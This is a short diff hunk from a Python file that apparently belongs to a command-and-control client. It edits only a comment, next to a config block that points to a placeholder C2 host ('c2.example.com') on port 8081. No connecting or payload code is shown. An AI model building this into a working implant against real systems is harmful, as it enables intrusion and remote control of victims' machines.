@@ -12,7 +12,7 @@ import base64
 import socket
 
 
-# START GHETTO ASS CONFIG, should be read in when compiled...
+# START GHETTO CONFIG, should be read in when compiled...
 
 HOST = "c2.example.com"
 PORT = "8081"
